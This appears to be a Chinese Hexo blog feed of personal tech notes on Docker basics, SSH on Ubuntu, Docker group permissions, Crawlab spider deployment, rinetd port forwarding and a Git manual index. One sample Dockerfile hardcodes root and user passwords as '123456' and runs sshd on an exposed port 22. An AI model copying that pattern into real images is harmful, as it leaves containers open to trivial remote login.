class="code"><pre><span class="line">$ docker pull ubuntu:18.04</span><br><span class="line">18.04: Pulling from library&#x2F;ubuntu</span><br><span class="line">bf5d46315322: Pull complete</span><br><span class="line">9f13e0ac480c: Pull complete</span><br><span class="line">e8988b5b3097: Pull complete</span><br><span class="line">40af181810e7: Pull complete</span><br><span class="line">e6f7c7e5c03e: Pull complete</span><br><span class="line">Digest: sha256:147913621d9cdea08853f6ba9116c2e27a3ceffecf3b492983ae97c3d643fbbe</span><br><span class="line">Status: Downloaded newer image for ubuntu:18.04</span><br></pre></td></tr></table></figure><p>每个仓库会有多个镜像，用tag标示，如果不加tag，默认使用latest镜像。从下载过程中可以看到分层存储的概念，镜像是由多层存储所构成。下载也是一层层的去下载，并非单一文件。下载过程中给出了每一层的 ID 的前 12 位。并且下载结束后，给出该镜像完整的 sha256 的摘要，以确保下载一致性。</p><h4 id="查看当前系统中的images信息"><a href="#查看当前系统中的images信息" class="headerlink" title="查看当前系统中的images信息"></a>查看当前系统中的images信息</h4><pre><code>$ docker images或者$ docker image lsREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              18.04               c3c304cb4f22        5 weeks ago         64.2MBhello-world         latest              bf756fb1ae65        5 months ago        13.3kB</code></pre><h3 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h3><p>在入门操作后，我们先熟悉下容器的一些使用</p><h4 id="容器内运行应用程序"><a href="#容器内运行应用程序" class="headerlink" title="容器内运行应用程序"></a>容器内运行应用程序</h4><p>Docker 允许你在容器内运行应用程序， 使用 docker run 命令来在容器内运行一个应用程序</p><p>尝试输出 Hello world</p><pre><code>$ docker run ubuntu:18.04 /bin/echo &quot;Hello world&quot;Hello world</code></pre><p>各个参数解析：</p><pre><code>docker: Docker 的二进制执行文件。run: 与前面的 docker 组合来运行一个容器。ubuntu:18.04 指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像。/bin/echo &quot;Hello world&quot;: 在启动的容器里执行的命令</code></pre><p>以上命令完整的意思可以解释为：Docker 以 ubuntu 18.04 镜像创建一个新容器，然后在容器里执行 bin/echo “Hello world”，然后输出结果。</p><h4 id="运行交互式的容器"><a href="#运行交互式的容器" class="headerlink" title="运行交互式的容器"></a>运行交互式的容器</h4><p>我们通过 docker 的两个参数 -i -t，让 docker 运行的容器实现”对话”的能力：</p><pre><code>$ docker run -i -t ubuntu:18.04 /bin/bashroot@89ef2ef0ac6e:/# </code></pre><p>各个参数解析：</p><pre><code>-t: 在新容器内指定一个伪终端或终端。-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>注意第二行 root@89ef2ef0ac6e:/# ，此时我们已进入一个 ubuntu18.04 系统的容器</p><p>我们尝试在容器中运行命令 cat /proc/version和ls分别查看当前系统的版本信息和当前目录下的文件列表</p><pre><code>root@89ef2ef0ac6e:/# cat /proc/versionLinux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020root@89ef2ef0ac6e:/# lsbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</code></pre><p>我们可以通过运行 exit 命令或者使用 CTRL+D 来退出容器。</p><pre><code>root@89ef2ef0ac6e:/# exitexit</code></pre><h4 id="后台模式启动容器"><a href="#后台模式启动容器" class="headerlink" title="后台模式启动容器"></a>后台模式启动容器</h4><p>使用以下命令创建一个以进程方式运行的容器，加了 -d 参数 指定容器后台运行，默认不会进入容器，想要进入容器需要使用指令 docker exec（下面会介绍到）。</p><pre><code>$ docker run -d ubuntu:18.04 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;727ee8f47dc669e49e6d16dfb731380e9e20e6f6916670856cc815a2568caec1</code></pre><p>在输出中，我们没有看到期望的 “hello world”，而是一串长字符。这个长字符串叫做容器 ID，对每个容器来说都是唯一的，我们可以通过容器 ID 来查看对应的容器发生了什么。</p><p>首先，我们需要确认容器有在运行，可以通过 docker ps 来查看：</p><pre><code>$ docker psCONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS                              NAMES727ee8f47dc6        ubuntu:18.04             &quot;/bin/sh -c &#39;while t…&quot;   2 seconds ago       Up 1 second                                            intelligent_pascal</code></pre><p>输出详情介绍：</p><pre><code>CONTAINER ID: 容器 ID。IMAGE: 使用的镜像。COMMAND: 启动容器时运行的命令。CREATED: 容器的创建时间。STATUS: 容器状态。状态有7种：    created（已创建）    restarting（重启中）    running（运行中）    removing（迁移中）    paused（暂停）    exited（停止）    dead（死亡）PORTS: 容器的端口信息和使用的连接类型（tcp\udp）。NAMES: 自动分配的容器名称。</code></pre><p>在宿主主机内使用 docker logs 命令，查看容器内的标准输出：</p><pre><code>$ docker logs 727ee8f47dc6hello worldhello worldhello worldhello worldhello worldhello world...$ docker logs -f 727ee8f47dc6注：参数-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。</code></pre><p>使用 docker stop 命令来停止容器: </p><pre><code>$ docker stop 727ee8f47dc6727ee8f47dc6</code></pre><p>通过 docker ps 查看，容器已经停止工作。</p><h4 id="启动已停止运行的容器"><a href="#启动已停止运行的容器" class="headerlink" title="启动已停止运行的容器"></a>启动已停止运行的容器</h4><p>查看所有的容器命令如下：</p><pre><code>$ docker ps -a</code></pre><p>使用 docker start 启动一个已停止的容器：</p><pre><code>$ docker start &lt;容器 ID&gt;</code></pre><p>停止一个容器</p><pre><code>$ docker stop &lt;容器 ID&gt;</code></pre><p>重启一个容器</p><pre><code>$ docker restart &lt;容器 ID&gt;</code></pre><h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><p>参数<br>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：</p><ul><li><p>docker attach &lt;容器 ID&gt;</p></li><li><p>docker exec -it &lt;容器 ID&gt; /bin/bash</p></li></ul><p>推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。</p><h4 id="导出和导入容器"><a href="#导出和导入容器" class="headerlink" title="导出和导入容器"></a>导出和导入容器</h4><p>导出容器</p><p>如果要导出本地某个容器，可以使用 docker export 命令。</p><pre><code>$ docker export 727ee8f47dc6 &gt; ubuntu.tar</code></pre><p>导出容器 727ee8f47dc6 快照到本地文件 ubuntu.tar。</p><p>导入容器快照</p><p>可以使用 docker import 从容器快照文件中再导入为镜像，以下实例将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1:</p><pre><code>$ cat docker/ubuntu.tar | docker import - test/ubuntu:v1</code></pre><p>查看镜像，发现有test/ubuntu</p><pre><code>$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED              SIZEtest/ubuntu         v1                  25af3699caaf        About a minute ago   64.2MB</code></pre><p>此外，也可以通过指定 URL 或者某个目录来导入，例如：</p><pre><code>$ docker import http://example.com/exampleimage.tgz example/imagerepo</code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><p>删除容器使用 docker rm 命令：</p><pre><code>$ docker rm -f 727ee8f47dc6</code></pre><p>删除容器时，容器必须是停止状态，否则会报错。</p><p>清理掉所有处于终止状态的容器</p><pre><code>$ docker container prune </code></pre><h4 id="停止、删除所有的docker容器和镜像"><a href="#停止、删除所有的docker容器和镜像" class="headerlink" title="停止、删除所有的docker容器和镜像"></a>停止、删除所有的docker容器和镜像</h4><p>列出所有的容器 ID</p><pre><code>docker ps -aq</code></pre><p>停止所有的容器</p><pre><code>docker stop $(docker ps -aq)</code></pre><p>删除所有的容器</p><pre><code>docker rm $(docker ps -aq)</code></pre><p>删除所有的镜像</p><pre><code>docker rmi $(docker images -q)</code></pre><h4 id="将本地文件上传到容器的指定目录中"><a href="#将本地文件上传到容器的指定目录中" class="headerlink" title="将本地文件上传到容器的指定目录中"></a>将本地文件上传到容器的指定目录中</h4><pre><code>$ docker cp 本地文件路径 ID全称:容器路径</code></pre><h4 id="查看容器完整command"><a href="#查看容器完整command" class="headerlink" title="查看容器完整command"></a>查看容器完整command</h4><pre><code>$ docker ps -a --no-trunc</code></pre><h3 id="docker实例-运行一个-web-应用"><a href="#docker实例-运行一个-web-应用" class="headerlink" title="docker实例 运行一个 web 应用"></a>docker实例 运行一个 web 应用</h3><p>前面我们运行的容器并没有一些什么特别的用处。</p><p>接下来让我们尝试使用 docker 构建一个 web 应用程序。</p><p>我们将在docker容器中运行一个 Python Flask 应用来运行一个web应用。</p><pre><code>$ docker pull training/webapp  # 载入镜像$ docker run -d -P training/webapp python app.py</code></pre><p>参数说明:</p><pre><code>-d:让容器在后台运行。-P:将容器内部使用的网络端口映射到我们使用的主机上。</code></pre><p>使用 docker ps 来查看我们正在运行的容器：</p><pre><code>$ docker ps -aCONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS                            PORTS                     NAMES5d980575f0ee        training/webapp          &quot;python app.py&quot;          6 seconds ago       Up 5 seconds                      0.0.0.0:32768-&gt;5000/tcp   elastic_khorana</code></pre><p>这里多了端口信息</p><pre><code>PORTS0.0.0.0:32768-&gt;5000/tcp</code></pre><p>Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上。</p><p>这时我们可以通过浏览器输入127.0.0.1：32768访问WEB应用，页面打印出Hello world!</p><p>我们也可以通过 -p 参数来设置不一样的端口：</p><pre><code>$ docker run -d -p 5000:5000 training/webapp python app.py</code></pre><p>通过 docker ps 命令可以查看到容器的端口映射，docker 还提供了另一个快捷方式 docker port，使用 docker port 可以查看指定 （ID 或者名字）容器的某个确定端口映射到宿主机的端口号。</p><pre><code>$ docker port 5d980575f0ee$ docker port elastic_khorana</code></pre><p>使用 docker top 来查看容器内部运行的进程</p><pre><code>$ docker top elastic_khoranaUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                37043               37015               0                   22:28               ?                   00:00:00            python app.py</code></pre><p>使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。</p><pre><code>$ docker inspect elastic_khorana[&#123;    &quot;Id&quot;: &quot;5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d&quot;,    &quot;Created&quot;: &quot;2020-06-03T14:28:38.176083183Z&quot;,    &quot;Path&quot;: &quot;python&quot;,    &quot;Args&quot;: [        &quot;app.py&quot;    ],    &quot;State&quot;: &#123;        &quot;Status&quot;: &quot;running&quot;,        &quot;Running&quot;: true,        &quot;Paused&quot;: false,        &quot;Restarting&quot;: false,        &quot;OOMKilled&quot;: false,        &quot;Dead&quot;: false,        &quot;Pid&quot;: 37043,        &quot;ExitCode&quot;: 0,        &quot;Error&quot;: &quot;&quot;,        &quot;StartedAt&quot;: &quot;2020-06-03T14:28:39.128547294Z&quot;,        &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;    &#125;,    &quot;Image&quot;: &quot;sha256:6fae60ef344644649a39240b94d73b8ba9c67f898ede85cf8e947a887b3e6557&quot;,    &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d/resolv.conf&quot;,    &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d/hostname&quot;,    &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d/hosts&quot;,    &quot;LogPath&quot;: &quot;/var/lib/docker/containers/5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d/5d980575f0ee5c9a62c75a72c9574fecd9c357c00dd17056fd0dad3af4f4e13d-json.log&quot;,    &quot;Name&quot;: &quot;/elastic_khorana&quot;,....</code></pre><h3 id="镜像使用"><a href="#镜像使用" class="headerlink" title="镜像使用"></a>镜像使用</h3><p>在入门操作时，我们已经接触了一些镜像操作命令，接下来详细了解一些关于镜像的使用</p><h4 id="列出镜像列表"><a href="#列出镜像列表" class="headerlink" title="列出镜像列表"></a>列出镜像列表</h4><pre><code>$ docker images   </code></pre><h4 id="使用镜像运行容器"><a href="#使用镜像运行容器" class="headerlink" title="使用镜像运行容器"></a>使用镜像运行容器</h4><pre><code>$ docker run -t -i ubuntu:14.04 /bin/bash </code></pre><h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><pre><code>$  docker search ubuntu</code></pre><h4 id="获取一个新的镜像"><a href="#获取一个新的镜像" class="headerlink" title="获取一个新的镜像"></a>获取一个新的镜像</h4><pre><code>$ docker pull ubuntu:18.04</code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre><code>$ docker rmi hello-world</code></pre><p>当我们从 docker 镜像仓库中下载的镜像不能满足我们的需求时，我们可以通过以下两种方式对镜像进行更改。</p><p>1、从已经创建的容器中更新镜像，并且提交这个镜像</p><p>2、使用 Dockerfile 指令来创建一个新的镜像</p><h4 id="更新镜像"><a href="#更新镜像" class="headerlink" title="更新镜像"></a>更新镜像</h4><p>更新镜像之前，我们需要使用镜像来创建一个容器。 </p><pre><code>$ docker run -t -i ubuntu:15.10 /bin/bashroot@e218edb10161:/# </code></pre><p>在运行的容器内使用 apt-get update 命令进行更新。</p><p>在完成操作之后，输入 exit 命令来退出这个容器。</p><p>此时 ID 为 e218edb10161 的容器，是按我们的需求更改的容器。我们可以通过命令 docker commit 来提交容器副本。</p><pre><code>$ docker commit -m=&quot;has update&quot; -a=&quot;test&quot; e218edb10161 test/ubuntu:v2sha256:70bf1840fd7c0d2d8ef0a42a817eb29f854c1af8f7c59fc03ac7bdee9545aff8</code></pre><p>各个参数说明：</p><pre><code>-m: 提交的描述信息-a: 指定镜像作者e218edb10161：容器 IDtest/ubuntu:v2: 指定要创建的目标镜像名</code></pre><p>我们可以使用 docker images 命令来查看我们的新镜像 test/ubuntu:v2： </p><pre><code>$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEtest/ubuntu       v2                  70bf1840fd7c        15 seconds ago      158.5 MB</code></pre><p>使用我们的新镜像 runoob/ubuntu 来启动一个容器</p><pre><code>$ docker run -t -i test/ubuntu:v2 /bin/bash                            root@1a9fbdeb5da3:/#</code></pre><h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>我们使用命令 docker build ， 从零开始来创建一个新的镜像。为此，我们需要创建一个 Dockerfile 文件，其中包含一组指令来告诉 Docker 如何构建我们的镜像。</p><pre><code>$ cat Dockerfile FROM    centos:6.7MAINTAINER      Fisher &quot;fisher@sudops.com&quot;RUN     /bin/echo &#39;root:123456&#39; |chpasswdRUN     useradd runoobRUN     /bin/echo &#39;runoob:123456&#39; |chpasswdRUN     /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/localEXPOSE  22EXPOSE  80CMD     /usr/sbin/sshd -D</code></pre><p>每一个指令都会在镜像上创建一个新的层，每一个指令的前缀都必须是大写的。</p><p>第一条FROM，指定使用哪个镜像源</p><p>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。。</p><p>然后，我们使用 Dockerfile 文件，通过 docker build 命令来构建一个镜像。</p><pre><code>$ docker build -t runoob/centos:6.7 .Sending build context to Docker daemon 17.92 kBStep 1 : FROM centos:6.7---&amp;gt; d95b5ca17cc3Step 2 : MAINTAINER Fisher &quot;fisher@sudops.com&quot;---&amp;gt; Using cache---&amp;gt; 0c92299c6f03Step 3 : RUN /bin/echo &#39;root:123456&#39; |chpasswd---&amp;gt; Using cache---&amp;gt; 0397ce2fbd0aStep 4 : RUN useradd runoob......</code></pre><p>参数说明：</p><pre><code>-t ：指定要创建的目标镜像名. ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径</code></pre><p>使用docker images 查看创建的镜像已经在列表中存在,镜像ID为860c279d2fec</p><pre><code>$ docker images REPOSITORY          TAG                 IMAGE ID            CREATED              SIZErunoob/centos       6.7                 860c279d2fec        About a minute ago   190.6 MB</code></pre><p>我们可以使用新的镜像来创建容器</p><pre><code>$ docker run -t -i runoob/centos:6.7  /bin/bash[root@41c28d18b5fb /]# id runoobuid=500(runoob) gid=500(runoob) groups=500(runoob)</code></pre><p>从上面看到新镜像已经包含我们创建的用户 runoob。</p><p>设置镜像标签</p><p>我们可以使用 docker tag 命令，为镜像添加一个新的标签。</p><pre><code>$ docker tag 860c279d2fec runoob/centos:dev</code></pre><p>docker tag 镜像ID，这里是 860c279d2fec ,用户名称、镜像源名(repository name)和新的标签名(tag)。</p><p>使用 docker images 命令可以看到，ID为860c279d2fec的镜像多一个标签。</p><pre><code>$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZErunoob/centos       6.7                 860c279d2fec        5 hours ago         190.6 MBrunoob/centos       dev                 860c279d2fec        5 hours ago         190.6 MB</code></pre><p>6.8日 学习至 容器连接<br><a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 无法进行SSH连接 开启22端口</title>
      <link href="2020/06/06/2020-06-06-ubuntu_sshd/"/>
      <url>2020/06/06/2020-06-06-ubuntu_sshd/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu-无法进行SSH连接-开启22端口"><a href="#Ubuntu-无法进行SSH连接-开启22端口" class="headerlink" title="Ubuntu 无法进行SSH连接 开启22端口"></a>Ubuntu 无法进行SSH连接 开启22端口</h2><p>进入Ubuntu 查看22 端口的情况，发现22端口并未开启</p><pre><code>netstat -ntlp|grep 22</code></pre><p>进入Ubuntu 查看22 端口的情况，发现22端口并未开启</p><pre><code>sudo apt-get install openssh-serversudo apt-get install ufwsudo ufw enablesudo ufw allow 22</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 启动 Get Permission Denied</title>
      <link href="2020/06/05/2020-06-05-docker_Get_Permission_Denied/"/>
      <url>2020/06/05/2020-06-05-docker_Get_Permission_Denied/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-启动-Get-Permission-Denied"><a href="#Docker-启动-Get-Permission-Denied" class="headerlink" title="Docker 启动 Get Permission Denied"></a>Docker 启动 Get Permission Denied</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>安装完docker后，执行docker相关命令，出现</p><pre><code>Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/images/json: dial unix /var/run/docker.sock: connect: permission denied</code></pre><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>docker进程使用Unix Socket而不是TCP端口。而默认情况下，Unix socket属于root用户，需要root权限才能访问。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>法一：</p><p>使用sudo获取管理员权限，运行docker命令</p><p>法二：</p><p>docker守护进程启动的时候，会默认赋予名字为docker的用户组读写Unix socket的权限，因此只要创建docker用户组，并将当前用户加入到docker用户组中，那么当前用户就有权限访问Unix socket了，进而也就可以执行docker相关命令</p><pre><code>sudo groupadd docker     #添加docker用户组sudo gpasswd -a $USER docker     #将登陆用户加入到docker用户组中newgrp docker     #更新用户组docker ps    #测试docker命令是否可以使用sudo正常使用</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Crawlab进行爬虫管理</title>
      <link href="2020/06/04/2020-06-04-crawlab_manage_spiders/"/>
      <url>2020/06/04/2020-06-04-crawlab_manage_spiders/</url>
      
        <content type="html"><![CDATA[<h2 id="Crawlab"><a href="#Crawlab" class="headerlink" title="Crawlab"></a>Crawlab</h2><p><a href="https://docs.crawlab.cn/zh/">Crawlab官方文档</a></p><p><a href="https://github.com/crawlab-team/crawlab">Crawlab Github地址</a></p><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>Crawlab 的整体架构由五大部分组成：</p><pre><code>主节点（ Master Node ）：负责任务派发、API、部署爬虫等；工作节点（ Worker Node ）：负责执行爬虫任务；MongoDB 数据库：存储节点、爬虫、任务等日常运行数据；Redis 数据库：储存任务消息队列、节点心跳等信息。前端客户端：Vue 应用，负责前端交互和向后端请求数据。</code></pre><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Crawlab的安装官方文档有几种方式，个人选择了Docker安装。</p><p>直接pull镜像</p><pre><code>docker pull tikazyq/crawlab:latest</code></pre><p>再执行以下命令</p><pre><code>git clone https://github.com/crawlab-team/crawlabcd crawlab</code></pre><p>安装 docker-compose </p><pre><code>pip install docker-compose</code></pre><p>定义 docker-compose.yml ， compose 文件是一个定义服务、 网络和卷的 YAML 文件 。Compose 文件的默认路径是 ./docker-compose.yml。服务定义包含应用于为该服务启动的每个容器的配置。</p><pre><code>version: &#39;3.3&#39;services:master:     image: tikazyq/crawlab:latest    container_name: master    environment:    CRAWLAB_SERVER_MASTER: &quot;Y&quot;  # whether to be master node 是否为主节点，主节点为 Y，工作节点为 N    CRAWLAB_MONGO_HOST: &quot;mongo&quot;  # MongoDB host address MongoDB 的地址，在 docker compose 网络中，直接引用服务名称    CRAWLAB_REDIS_ADDRESS: &quot;redis&quot;  # Redis host address Redis 的地址，在 docker compose 网络中，直接引用服务名称    ports:        - &quot;8080:8080&quot; # frontend port mapping 前端端口映射    depends_on:    - mongo    - redisworker:    image: tikazyq/crawlab:latest    container_name: worker    environment:    CRAWLAB_SERVER_MASTER: &quot;N&quot;    CRAWLAB_MONGO_HOST: &quot;mongo&quot;    CRAWLAB_REDIS_ADDRESS: &quot;redis&quot;    depends_on:    - mongo    - redismongo:    image: mongo:latest    restart: alwaysredis:    image: redis:latest    restart: always</code></pre><p>运行以下命令就可以启动Crawlab</p><pre><code>docker-compose up -d</code></pre><p>然后在浏览器中输入 <a href="http://localhost:8080/">http://localhost:8080</a> 就可以看到界面了。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab1.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab2.png"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>个人编写的爬虫是scrapy多爬虫，并在根目录下自建了scrapy crawlall命令，其中有的爬虫还需要科学上网。</p><p>上传爬虫可以上传zip，也可以通过CLI。我采用的是后者。在爬虫根目录下，也就是包含scrapy.cfg的那层，执行命令crawlab upload，即可将爬虫上传到crawlab worker爬虫容器中，目录为app/spiders下。刷新web页面，可以在页面上看到我们刚上传的爬虫。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab3.png"></p><p>此时，需要提一下，crawlab执行过程共使用到4个容器：</p><p>通过docker ps -a查看：</p><pre><code>CONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS                              NAMESa6058f3b1603        tikazyq/crawlab:latest   &quot;/bin/bash /app/dock…&quot;   11 hours ago        Up 9 hours          8000/tcp, 8080/tcp                 a6058f3b1603_worker327fe6ae6e32        tikazyq/crawlab:latest   &quot;/bin/bash /app/dock…&quot;   11 hours ago        Up 10 hours         8000/tcp, 0.0.0.0:8080-&gt;8080/tcp   master6780ef4cd20b        redis:latest             &quot;docker-entrypoint.s…&quot;   11 hours ago        Up 10 hours         6379/tcp                           crawlab_redis_155729de5fa05        mongo:latest             &quot;docker-entrypoint.s…&quot;   11 hours ago        Up 10 hours         27017/tcp                          crawlab_mongo_1</code></pre><p>通过name可以清楚地知道每个容器的作用</p><p>爬虫在第一个容器worker当中，我们进入该容器</p><pre><code>docker exec -it a6058f3b1603 /bin/bash</code></pre><p>进入 app/spiders 目录 ，可以看到我们上传的爬虫。</p><p>此时需要安装爬虫需要的依赖，安装完之后，执行scrapy命令爬取。</p><p>没有问题的话，到web页面中，对爬虫进行设置（由于个人编写的是多爬虫，导入后识别不出scrapy项目，所以没有勾选scrapy，直接运行scrapy crawlall），尝试运行，可以看到日志。当然也可以查看结果，需要在scrapy爬虫的settings.py中进行设置。在 settings.py 中找到 ITEM_PIPELINES（dict 类型的变量），在其中添加如下内容。</p><pre><code>ITEM_PIPELINES = &#123;    &#39;crawlab.pipelines.CrawlabMongoPipeline&#39;: 888,&#125;</code></pre><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crwalab4.png"></p><p>此外，因为有爬虫需要科学上网，在worker容器中配置了rinetd，将节点端口转发到节点网关（也就是宿主机）端口上即可。</p><p>以上就是初次使用Crawlab的过程，希望以后Crawlab可以识别scrapy多爬虫，以及可以创建虚拟环境安装依赖（目前需要全局依赖）等等。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crawlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在linux下使用rinetd端口转发</title>
      <link href="2020/06/04/2020-06-04-rinetd/"/>
      <url>2020/06/04/2020-06-04-rinetd/</url>
      
        <content type="html"><![CDATA[<h2 id="在linux下使用rinetd端口转发"><a href="#在linux下使用rinetd端口转发" class="headerlink" title="在linux下使用rinetd端口转发"></a>在linux下使用rinetd端口转发</h2><p>安装</p><pre><code>apt-get install rinetd</code></pre><p>配置</p><pre><code>vim /etc/rinetd.conf</code></pre><p>格式</p><pre><code>[Source Address] [Source Port] [Destination Address] [Destination Port]源地址 源端口 目的地址 目的端口例如：127.0.0.1 8118 172.18.0.1 8118</code></pre><p>启动</p><pre><code>rinetd -c /etc/rinetd.conf</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rinetd </tag>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>执行命令 docker-compose ps 时出错</title>
      <link href="2020/06/03/2020-06-03-docker-compose_ps_error/"/>
      <url>2020/06/03/2020-06-03-docker-compose_ps_error/</url>
      
        <content type="html"><![CDATA[<h2 id="执行命令-docker-compose-ps-时出错"><a href="#执行命令-docker-compose-ps-时出错" class="headerlink" title="执行命令 docker-compose ps 时出错"></a>执行命令 docker-compose ps 时出错</h2><pre><code>ERROR: Couldn&#39;t connect to Docker daemon at http+docker://localhost - is it running?  If it&#39;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</code></pre><p>原因是docker 每次都要sudo， 或者其他服务启动的时候，提示上述的错误</p><p>解决办法：</p><pre><code>如果还没有 docker group 就添加一个：sudo groupadd docker将用户加入该 group 内。然后退出并重新登录就生效啦。sudo gpasswd -a $&#123;USER&#125; docker重启 docker 服务sudo service docker restart切换当前会话到新 group 或者重启 X 会话newgrp - docker</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令参考手册</title>
      <link href="2020/06/03/2020-06-03-git_manual/"/>
      <url>2020/06/03/2020-06-03-git_manual/</url>
      
        <content type="html"><![CDATA[<h2 id="Git常用命令参考手册"><a href="#Git常用命令参考手册" class="headerlink" title="Git常用命令参考手册"></a>Git常用命令参考手册</h2><p>今天看到一个将Git常用命令总结的很好的仓库，故记录下来。</p><p>作者：xjh22222228<br>项目地址：<a href="https://github.com/xjh22222228/git-manual">https://github.com/xjh22222228/git-manual</a></p><h1 id="Git常用命令参考手册-git-repo"><a href="#Git常用命令参考手册-git-repo" class="headerlink" title="Git常用命令参考手册   git-repo"></a>Git常用命令参考手册 <img src="https://img.shields.io/github/license/xjh22222228/git-manual">  <a href="https://github.com/xjh22222228/git-manual">git-repo</a></h1><p>基本涵盖了在开发中用到的git命令，能满足日常需求。</p><center>  <img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/poster.png" /></center><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li><li><a href="#%E7%94%9F%E6%88%90SSHKey">生成SSHKey</a></li><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%93%E5%BA%93">初始化仓库</a></li><li><a href="#%E5%85%8B%E9%9A%86">克隆</a></li><li><a href="#cherry-pick">cherry-pick</a></li><li><a href="#%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81">文件状态</a></li><li><a href="#%E6%97%A5%E5%BF%97">日志</a></li><li><a href="#Blame">Blame</a></li><li><a href="#%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF">查看分支</a></li><li><a href="#%E5%88%87%E6%8D%A2%E5%88%86%E6%94%AF">切换分支</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E5%88%86%E6%94%AF">创建分支</a></li><li><a href="#%E5%88%A0%E9%99%A4%E5%88%86%E6%94%AF">删除分支</a></li><li><a href="#%E9%87%8D%E5%91%BD%E5%90%8D%E5%88%86%E6%94%AF">重命名分支</a></li><li><a href="#%E5%90%88%E5%B9%B6">合并</a></li><li><a 